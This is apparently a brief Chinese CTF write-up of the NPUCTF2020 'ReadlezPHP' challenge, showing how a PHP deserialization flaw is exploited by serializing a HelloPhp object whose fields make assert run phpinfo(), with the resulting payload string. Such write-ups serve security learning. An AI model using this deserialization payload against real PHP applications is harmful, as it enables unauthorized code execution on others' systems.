# [NPUCTF2020]ReadlezPHP 反序列化简单反序列

题目还是挺简单的

看代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc68819c03e73388e45ced6d014bfe9a.png" alt="" style="max-height:75px; box-sizing:content-box;" />


访问一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/99c41b006574ba5cbe69f19a44c83b3b.png" alt="" style="max-height:682px; box-sizing:content-box;" />


一看就是反序列化

看看执行主要是 echo $b($a)

那就是$b是命令 $a是参数

这里还要fuzz一下 因为system不能执行

所以我们可以使用其他命令执行函数例如 assert

我们看看如何构造

```php
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    } 
 
创建的时候 赋值 data(Y-m-d h:i:s)
 
所以很明显 我们只需要将b设置为我们的命令函数
 
a设置为参数即可
```

```php
<?php
class HelloPhp
{ 
    public $a="phpinfo()";
    public $b="assert";
  }
echo serialize(new HelloPhp());
```

payload

```cobol
O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/34467f895b2f0833e2b15e52ed10e633.png" alt="" style="max-height:280px; box-sizing:content-box;" />


就是这么简单结束了